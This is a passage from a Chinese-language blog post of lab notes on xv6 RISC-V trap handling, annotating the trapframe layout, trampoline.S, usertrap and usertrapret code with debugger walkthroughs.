class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// per-process data for the trap handling code in trampoline.S.</span></span><br><span class="line"><span class="comment">// sits in a page by itself just under the trampoline page in the</span></span><br><span class="line"><span class="comment">// user page table. not specially mapped in the kernel page table.</span></span><br><span class="line"><span class="comment">// uservec in trampoline.S saves user registers in the trapframe,</span></span><br><span class="line"><span class="comment">// then initializes registers from the trapframe&#x27;s</span></span><br><span class="line"><span class="comment">// kernel_sp, kernel_hartid, kernel_satp, and jumps to kernel_trap.</span></span><br><span class="line"><span class="comment">// usertrapret() and userret in trampoline.S set up</span></span><br><span class="line"><span class="comment">// the trapframe&#x27;s kernel_*, restore user registers from the</span></span><br><span class="line"><span class="comment">// trapframe, switch to the user page table, and enter user space.</span></span><br><span class="line"><span class="comment">// the trapframe includes callee-saved user registers like s0-s11 because the</span></span><br><span class="line"><span class="comment">// return-to-user path via usertrapret() doesn&#x27;t return through</span></span><br><span class="line"><span class="comment">// the entire kernel call stack.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">/*   0 */</span> uint64 kernel_satp;   <span class="comment">// kernel page table tarp处理代码将要加载到satp寄存器的数值</span></span><br><span class="line">  <span class="comment">/*   8 */</span> uint64 kernel_sp;     <span class="comment">// top of process&#x27;s kernel stack</span></span><br><span class="line">  <span class="comment">/*  16 */</span> uint64 kernel_trap;   <span class="comment">// usertrap()</span></span><br><span class="line">  <span class="comment">/*  24 */</span> uint64 epc;           <span class="comment">// saved user program counter</span></span><br><span class="line">  <span class="comment">/*  32 */</span> uint64 kernel_hartid; <span class="comment">// saved kernel tp</span></span><br><span class="line">  <span class="comment">/*  40 */</span> uint64 ra;</span><br><span class="line">  <span class="comment">/*  48 */</span> uint64 sp;</span><br><span class="line">  <span class="comment">/*  56 */</span> uint64 gp;</span><br><span class="line">  <span class="comment">/*  64 */</span> uint64 tp;</span><br><span class="line">  <span class="comment">/*  72 */</span> uint64 t0;</span><br><span class="line">  <span class="comment">/*  80 */</span> uint64 t1;</span><br><span class="line">  <span class="comment">/*  88 */</span> uint64 t2;</span><br><span class="line">  <span class="comment">/*  96 */</span> uint64 s0;</span><br><span class="line">  <span class="comment">/* 104 */</span> uint64 s1;</span><br><span class="line">  <span class="comment">/* 112 */</span> uint64 a0;</span><br><span class="line">  <span class="comment">/* 120 */</span> uint64 a1;</span><br><span class="line">  <span class="comment">/* 128 */</span> uint64 a2;</span><br><span class="line">  <span class="comment">/* 136 */</span> uint64 a3;</span><br><span class="line">  <span class="comment">/* 144 */</span> uint64 a4;</span><br><span class="line">  <span class="comment">/* 152 */</span> uint64 a5;</span><br><span class="line">  <span class="comment">/* 160 */</span> uint64 a6;</span><br><span class="line">  <span class="comment">/* 168 */</span> uint64 a7;</span><br><span class="line">  <span class="comment">/* 176 */</span> uint64 s2;</span><br><span class="line">  <span class="comment">/* 184 */</span> uint64 s3;</span><br><span class="line">  <span class="comment">/* 192 */</span> uint64 s4;</span><br><span class="line">  <span class="comment">/* 200 */</span> uint64 s5;</span><br><span class="line">  <span class="comment">/* 208 */</span> uint64 s6;</span><br><span class="line">  <span class="comment">/* 216 */</span> uint64 s7;</span><br><span class="line">  <span class="comment">/* 224 */</span> uint64 s8;</span><br><span class="line">  <span class="comment">/* 232 */</span> uint64 s9;</span><br><span class="line">  <span class="comment">/* 240 */</span> uint64 s10;</span><br><span class="line">  <span class="comment">/* 248 */</span> uint64 s11;</span><br><span class="line">  <span class="comment">/* 256 */</span> uint64 t3;</span><br><span class="line">  <span class="comment">/* 264 */</span> uint64 t4;</span><br><span class="line">  <span class="comment">/* 272 */</span> uint64 t5;</span><br><span class="line">  <span class="comment">/* 280 */</span> uint64 t6;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以，如何保存用户寄存器的一半答案是，内核非常方便的将trapframe page 映射到了每个user page table。</p><p>另一半的答案在于我们之前提到过的SSCRATCH寄存器。这个由RISC-V提供的SSRCATCH寄存器，就是为接下来的目的而创建的。内核会将trapframe page的地址保存在这个寄存器中，也就是0x3fffffe000这个地址。更重要的是，RISC-V有一个指令允许交换任意两个寄存器的值。而SSCRATCH寄存器的作用就是保存另一个寄存器的值，并将自己的值加载给另一个寄存器。如果我查看trampoline.S代码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">.section trampsec</span><br><span class="line">.globl trampoline</span><br><span class="line">.globl usertrap</span><br><span class="line">trampoline:</span><br><span class="line">.align 4</span><br><span class="line">.globl uservec</span><br><span class="line">uservec:    </span><br><span class="line">#</span><br><span class="line">        # trap.c sets stvec to point here, so</span><br><span class="line">        # traps from user space start here,</span><br><span class="line">        # in supervisor mode, but with a</span><br><span class="line">        # user page table.</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">        # save user a0 in sscratch so</span><br><span class="line">        # a0 can be used to get at TRAPFRAME.</span><br><span class="line">        csrw sscratch, a0 // 将 a0 寄存器的值存储到 sscratch 寄存器中，也就是0x3f ffff e000</span><br><span class="line"></span><br><span class="line">        # each process has a separate p-&gt;trapframe memory area,</span><br><span class="line">        # but it&#x27;s mapped to the same virtual address</span><br><span class="line">        # (TRAPFRAME) in every process&#x27;s user page table.</span><br><span class="line">        li a0, TRAPFRAME # 这里开始 a0 指向 TRAPFRAME </span><br><span class="line">        </span><br><span class="line">        # save the user registers in TRAPFRAME 每个寄存器占8字节</span><br><span class="line">        sd ra, 40(a0)</span><br><span class="line">        sd sp, 48(a0)</span><br><span class="line">        sd gp, 56(a0)</span><br><span class="line">        sd tp, 64(a0)</span><br><span class="line">        sd t0, 72(a0)</span><br><span class="line">        sd t1, 80(a0)</span><br><span class="line">        sd t2, 88(a0)</span><br><span class="line">        sd s0, 96(a0)</span><br><span class="line">        sd s1, 104(a0)</span><br><span class="line">        sd a1, 120(a0)</span><br><span class="line">        sd a2, 128(a0)</span><br><span class="line">        sd a3, 136(a0)</span><br><span class="line">        sd a4, 144(a0)</span><br><span class="line">        sd a5, 152(a0)</span><br><span class="line">        sd a6, 160(a0)</span><br><span class="line">        sd a7, 168(a0)</span><br><span class="line">        sd s2, 176(a0)</span><br><span class="line">        sd s3, 184(a0)</span><br><span class="line">        sd s4, 192(a0)</span><br><span class="line">        sd s5, 200(a0)</span><br><span class="line">        sd s6, 208(a0)</span><br><span class="line">        sd s7, 216(a0)</span><br><span class="line">        sd s8, 224(a0)</span><br><span class="line">        sd s9, 232(a0)</span><br><span class="line">        sd s10, 240(a0)</span><br><span class="line">        sd s11, 248(a0)</span><br><span class="line">        sd t3, 256(a0)</span><br><span class="line">        sd t4, 264(a0)</span><br><span class="line">        sd t5, 272(a0)</span><br><span class="line">        sd t6, 280(a0)</span><br><span class="line"></span><br><span class="line"># save the user a0 in p-&gt;trapframe-&gt;a0</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, 112(a0) # 将 t0 寄存器的值存储到 a0 寄存器指向的偏移量为 112 字节的位置</span><br><span class="line"></span><br><span class="line">        # initialize kernel stack pointer, from p-&gt;trapframe-&gt;kernel_sp</span><br><span class="line">        ld sp, 8(a0) # 将 a0 寄存器指向的地址加上8字节偏移后的内存位置的内容加载到栈指针sp寄存器中</span><br><span class="line">        # a0 寄存器指向的地址加上8字节偏移后的内存位置就是 内核栈指针</span><br><span class="line"></span><br><span class="line">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span><br><span class="line">        ld tp, 32(a0)</span><br><span class="line"></span><br><span class="line">        # load the address of usertrap(), from p-&gt;trapframe-&gt;kernel_trap</span><br><span class="line">        ld t0, 16(a0) # t0 指向 usertrap() 的地址</span><br><span class="line"></span><br><span class="line">        # fetch the kernel page table address, from p-&gt;trapframe-&gt;kernel_satp.</span><br><span class="line">        ld t1, 0(a0) # </span><br><span class="line"></span><br><span class="line">        # wait for any previous memory operations to complete, so that</span><br><span class="line">        # they use the user page table.</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # install the kernel page table.</span><br><span class="line">        csrw satp, t1</span><br><span class="line"></span><br><span class="line">        # flush now-stale user entries from the TLB.</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # jump to usertrap(), which does not return</span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure><p>这里解释一下<code>satp</code>寄存器。<code>satp</code>寄存器用于监督模式下的地址转换和保护。这个寄存器包含根页表的物理页号（PPN）、一个地址空间标识符（ASID），以及选择当前地址转换方案的MODE字段。ASID用于基于每个地址空间的地址转换隔离，而PPN是根页表的监督物理地址除以4KiB的结果。</p><p>也即，<code>satp</code>寄存器指向<code>page table</code></p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-02-29%2012.01.53.png" alt="截屏2024-02-29 12.01.53"></p><p>指令csrrw执行完后，交换了a0和sscratch的值，寄存器a0中的值为<code>0x3f ffff e000</code>，这是trapframe的虚拟地址。他之前保存在<code>SSCRATCH</code>寄存器中，但是现在交换到了a0中。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2015.08.25.png" alt="截屏2024-03-01 15.08.25"></p><p>我们也可以打印<code>sscratch</code>寄存器的值：</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2015.12.37.png" alt="截屏2024-03-01 15.12.37"></p><p>他现在的内容是2，这就是a0寄存器之前的值。a0寄存器保存的是write函数的第一个参数，在这个场景下，是Shell传入的文件描述符2。所以我们现在将a0的值保存起来了，并且我们有了指向trapframe page的指针。现在我们正在朝着保存用户寄存器的道路上前进。实际上，这就是trampoline.S中接下来30多个奇怪指令的工作。这些指令就是的执行sd，将每个寄存器保存在trapframe的不同偏移位置。因为a0在交换完之后包含的是trapframe page地址，也就是0x3fffffe000。所以，每个寄存器被保存在了偏移量+a0的位置。这些存储的指令比较无聊，我就不介绍了。</p><p>trapframe的地址是怎么出现在sscratch寄存器中的？</p><p>在内核前一次切换回用户空间时，内核会执行set sscratch指令，将这个寄存器的内容设置为<code>0x3f ffff e000</code>，也就是trapframe page的虚拟地址。所以，当我们运行用户代码，比如运行Shell时，sscratch保存的就是指向trapframe的地址。之后，Shell执行了ecall指令，跳转到了trampoline page，这个page中的第一条指令和第二条指令会将a0的值保存到sscratch中，然后将TRAPFRAME的地址加载到a0寄存器中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># save user a0 in sscratch so</span><br><span class="line"># a0 can be used to get at TRAPFRAME.</span><br><span class="line">csrw sscratch, a0</span><br><span class="line"></span><br><span class="line"># each process has a separate p-&gt;trapframe memory area,</span><br><span class="line"># but it&#x27;s mapped to the same virtual address</span><br><span class="line"># (TRAPFRAME) in every process&#x27;s user page table.</span><br><span class="line">li a0, TRAPFRAME</span><br></pre></td></tr></table></figure><p><strong>sscratch寄存器存在于cpu上</strong>，是一个特殊寄存器。</p><p>需要注意的是，一台机器总是从内核开始运行的，当机器启动的时候，它就是在内核中。任何时候，不管是进程第一次启动还是从一个系统调用返回，进入到用户空间的唯一方法就是执行sret指令。sret指令是由RISC-V定义的用来从supervisor mode 转换到 user mode。所以，在执行任何用户代码之前，都会调用函数<code>usertrapret()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jump to userret in trampoline.S at the top of memory, which </span></span><br><span class="line"><span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line"><span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">((<span class="type">void</span> (*)(uint64))trampoline_userret)(satp);</span><br></pre></td></tr></table></figure><p>在该函数的最后通过<code>((void (*)(uint64))trampoline_userret)(satp);</code>将satp传入trampoline.S的userret中。</p><p>现在运行程序并停留在寄存器拷贝结束的位置：</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2016.46.17.png" alt="截屏2024-03-01 16.46.17"></p><p>这条指令将从a0指向的内存地址往后数的第8个字节开始的数据加载到stack pointer寄存器。当前a0的内容为trapframe page的地址，在<code>proc.h</code>中的<code>trapframe</code>结构体也可以看出第8个字节开始的数据是内核的stack pointer（kernel_sp）。trapframe中的kernel_sp是由内核在进入用户空间前就设置好的，他的值是这个进程的kernel stack的最顶端。执行完这条指令之后，我们打印当前stack pointer寄存器。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2016.52.39.png" alt="截屏2024-03-01 16.52.39"></p><p>这是这个进程的kernel stack。因为xv6在每个kernel stack下面放置一个guard page，所以kernel stack的地址都比较大。</p><p>下一条指令向tp寄存器写入数据。因为在RISC-V中，没有一个直接的方法来确认当前运行在多处理器的哪个核上，<strong>XV6会将CPU核的编号，也就是hartid保存在tp寄存器中</strong>。在内核中好几个地方都会使用这个值，例如，内核可以通过这个值确定某个CPU核上运行了哪些进程。我们执行这条指令，并打印tp寄存器。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2017.04.19-9283865.png" alt="截屏2024-03-01 17.04.19"></p><p>现在我们知道当前进程运行在CPU的0核，这是因为我们配置的QEMU只给xv6分配了一个核，所以我们只能运行在核0上。</p><p>下一条指令向t0寄存器中写入数据。这里写入的是我们将要执行的第一个c函数的指针，也就是函数<code>usertrap()</code>的指针。我们在后面会使用这个指针。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2017.07.39.png" alt="截屏2024-03-01 17.07.39"></p><p>检索文件后发现，usertrap函数的地址确实为<code>0x80001e4e</code></p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2017.13.59.png" alt="截屏2024-03-01 17.13.59"></p><p>下一条指令是向<code>t1</code>寄存器中写入<code>kernel page table</code>的地址，我们可以打印<code>t1</code>寄存器的内容。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2018.33.41.png" alt="截屏2024-03-01 18.33.41"></p><p>严格来说，t1的内容并不是kernel page table的地址，这是你需要向SATP寄存器写入的数据。它包含了kernel page table的地址，但是移位了，并且包含了各种标志位。</p><p>下一条指令是交换satp和t1寄存器。这条指令执行完之后，当前程序会从user page table切换到 kernel page table。现在我们在QEMU中打印page table，可以看出与之前的page table完全不一样。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2018.43.58.png" alt="截屏2024-03-01 18.43.58"></p><p>现在这里输出的是由内核设置好的巨大的kernel page table。所以现在我们成功的切换了page table，我们在这个位置进展的很好，Stack Pointer指向了kernel stack；我们有了kernel page table，可以读取kernel data。我们已经准备好了执行内核中的C代码了。</p><p>这里还有个问题，为什么代码没有崩溃？毕竟我们在内存中的某个位置执行代码，程序计数器保存的是虚拟地址，如果我们切换了page table，为什么同一个虚拟地址不会通过新的page table寻址走到一些无关的page中？看起来我们现在没有崩溃并且还在执行这些指令。</p><blockquote><p>这是因为我们还在 trampoline page 中，而trampoline代码在用户空间和内核空间都映射到了同一个地址。</p></blockquote><p>完全正确。我不知道你们是否还记得user page table的内容，trampoline page在user page table中的映射与kernel page table中的映射是完全一样的。这两个page table中其他所有的映射都是不同的，只有trampoline page的映射是一样的，因此我们在切换page table时，寻址的结果不会改变，我们实际上就可以继续在同一个代码序列中执行程序而不崩溃。这是trampoline page的特殊之处，它同时在user page table和kernel page table都有相同的映射关系。</p><p>之所以叫trampoline page，是因为你某种程度在它上面“弹跳”了一下，然后从用户空间走到了内核空间。</p><p>最后一条指令是<code>jr t0</code>。执行了这条指令，我们就要从trampoline跳到内核的c代码中。这条指令的作用是跳转到t0指向的函数中。我们打印t0对应的一些命令。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2018.49.11.png" alt="截屏2024-03-01 18.49.11"></p><p>可以看到t0的位置对应于usertrap函数的开始。接下来就要以kernel stack，kernel page table跳转到usertrap函数。</p><h3 id="usertrap-函数"><a href="#usertrap-函数" class="headerlink" title="usertrap 函数"></a>usertrap 函数</h3><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2018.58.03.png" alt="截屏2024-03-01 18.58.03"></p><p>有很多原因都可以让程序运行进入到usertrap函数中来，比如系统调用，运算时除以0，使用了一个未被映射的虚拟地址，或者是设备中断。<code>usertrap</code>某种程度上存储并恢复硬件状态，但是它也需要检查触发trap的原因，以确定相应的处理方式。</p><p>接下来，让我们一步步执行usertrap函数。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.02.00.png" alt="截屏2024-03-01 19.02.00"></p><p>它做的第一件事情是更改<code>stvec</code>寄存器。取决于trap是来自于用户空间还是内核空间，实际上xv6处理trap的方法是不一样的。目前为止，我们只讨论过当trap是由用户空间发起时会发生什么。如果trap从内核空间发起，将会是一个不同的处理流程，因为从内核发起的话，程序已经在使用kernel page table。所以当trap发生时，程序执行仍然在内核的话，很多处理不必要存在。</p><p>在内核中执行任何操作之前，usertrap中先将stvec指向kernelvec变量，这是内核空间trap处理代码的位置，而不是用户空间trap处理代码的位置。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.14.07.png" alt="截屏2024-03-01 19.14.07"></p><p>我们需要知道当前运行的是什么进程，我们通过调用myproc函数来做到这一点。myproc函数实际上会查找一个根据当前CPU核的编号索引的数组，CPU核的编号是hartid，如果你还记得，我们之前在uservec函数中将它存在了tp寄存器。这是myproc函数找出当前运行进程的方法。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.15.42.png" alt="截屏2024-03-01 19.15.42"></p><p>接下来我们要保存用户程序计数器，它仍然保存在SEPC寄存器中，但是可能发生这种情况：当程序还在内核中执行时，我们可能切换到另一个进程，并进入到那个程序的用户空间，然后那个进程可能再调用一个系统调用进而导致SEPC寄存器的内容被覆盖。所以，我们需要保存当前进程的SEPC寄存器到一个与该进程关联的内存中，这样这个数据才不会被覆盖。这里我们使用trapframe来保存这个程序计数器。</p><p>接下来我们需要找出我们现在会在usertrap函数的原因。根据触发trap的原因，RISC-V的SCAUSE寄存器会有不同的数字。数字8表明，我们现在在trap代码中是因为系统调用。可以打印SCAUSE寄存器，它的确包含了数字8，我们的确是因为系统调用才走到这里的。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.17.39.png" alt="截屏2024-03-01 19.17.39"></p><p>所以，我们可以进到这个if语句中。接下来第一件事情是检查是不是有其他的进程杀掉了当前进程，但是我们的Shell没有被杀掉，所以检查通过。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.19.16.png" alt="截屏2024-03-01 19.19.16"></p><p>在RISC-V中，存储在SEPC寄存器中的程序计数器，是用户程序中触发trap的指令的地址。但是当我们恢复用户程序时，我们希望在下一条指令恢复，也就是ecall之后的一条指令。所以对于系统调用，我们对于保存的用户程序计数器加4，这样我们会在ecall的下一条指令恢复，而不是重新执行ecall指令。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.19.52.png" alt="截屏2024-03-01 19.19.52"></p><p>XV6会在处理系统调用的时候使能中断，这样中断可以更快的服务，有些系统调用需要许多时间处理。中断总是会被RISC-V的trap硬件关闭，所以在这个时间点，我们需要显式的打开中断。</p><p>下一行代码中，我们会调用syscall函数。这个函数定义在syscall.c</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2019.21.36.png" alt="截屏2024-03-01 19.21.36"></p><p>它的作用是从syscall表单中，根据系统调用的编号查找相应的系统调用函数。如果你还记得之前的内容，Shell调用的write函数将a7设置成了系统调用编号，对于write来说就是16。所以syscall函数的工作就是获取由trampoline代码保存在trapframe中a7的数字，然后用这个数字索引实现了每个系统调用的表单。</p><p>我们可以打印num，的确是16。这与Shell调用的write函数写入的数字是一致的。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2015.08.25-9294458.png" alt="截屏2024-03-01 15.08.25"></p><p>之后查看通过num索引得到的函数，正是sys_write函数。sys_write函数是内核对于write系统调用的具体实现。这里再往后的代码执行就非常复杂了，我就不具体介绍了。在这节课中，对于系统调用的实现，我只对进入和跳出内核感兴趣。这里我让代码直接执行sys_write函数。</p><p>这里有件有趣的事情，系统调用需要找到它们的参数。你们还记得write函数的参数吗？分别是文件描述符2，写入数据缓存的指针，写入数据的长度2。syscall函数直接通过trapframe来获取这些参数，就像这里刚刚可以查看trapframe中的a7寄存器一样，我们可以查看a0寄存器，这是第一个参数，a1是第二个参数，a2是第三个参数。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2020.01.59.png" alt="截屏2024-03-01 20.01.59"></p><p>现在syscall执行了真正的系统调用，之后sys_write返回了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use num to lookup the system call function for num, call it,</span></span><br><span class="line"><span class="comment">// and store its return value in p-&gt;trapframe-&gt;a0</span></span><br><span class="line">p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br></pre></td></tr></table></figure><p>这里向trapframe中的a0赋值的原因是：所有的系统调用都有一个返回值，比如write会返回实际写入的字节数，而RISC-V上的C代码的习惯是函数的返回值存储于寄存器a0，所以为了模拟函数的返回，我们将返回值存储在trapframe的a0中。之后，当我们返回到用户空间，trapframe中的a0槽位的数值会写到实际的a0寄存器，Shell会认为a0寄存器中的数值是write系统调用的返回值。执行完这一行代码之后，我们打印这里trapframe中a0的值，可以看到输出2。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-02%2009.58.11.png" alt="截屏2024-03-02 09.58.11"></p><p>这意味这sys_write的返回值是2，符合传入的参数，这里只写入了2个字节。</p><p>从syscall函数返回之后，我们回到了trap.c中的usertrap函数。</p><p>我们再次检查当前用户进程是否被杀掉了，因为我们不想恢复一个被杀掉的进程。当然，在我们的场景中，Shell没有被杀掉。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-02%2009.59.40.png" alt="截屏2024-03-02 09.59.40"></p><p>最后，usertrap调用了一个函数usertrapret。</p><h3 id="usertrapret函数"><a href="#usertrapret函数" class="headerlink" title="usertrapret函数"></a>usertrapret函数</h3><p>usertrap函数的最后调用了usertrapret函数，来设置好之前说过的，在返回到用户空间之前内核要做的工作。查看usertrapret函数的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// return to user space</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrapret</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we&#x27;re about to switch the destination of traps from</span></span><br><span class="line">  <span class="comment">// kerneltrap() to usertrap(), so turn off interrupts until</span></span><br><span class="line">  <span class="comment">// we&#x27;re back in user space, where usertrap() is correct.</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send syscalls, interrupts, and exceptions to uservec in trampoline.S</span></span><br><span class="line">  uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline);</span><br><span class="line">  w_stvec(trampoline_uservec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up trapframe values that uservec will need when</span></span><br><span class="line">  <span class="comment">// the process next traps into the kernel.</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set S Previous Privilege mode to User.</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tell trampoline.S the user page table to switch to.</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// jump to userret in trampoline.S at the top of memory, which </span></span><br><span class="line">  <span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line">  <span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">  uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="type">void</span> (*)(uint64))trampoline_userret)(satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><pre><code class="c">  // we&#39;re about to switch the destination of traps from  // kerneltrap() to usertrap(), so turn off interrupts until  // we&#39;re back in user space, where usertrap() is correct.  intr_off();<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   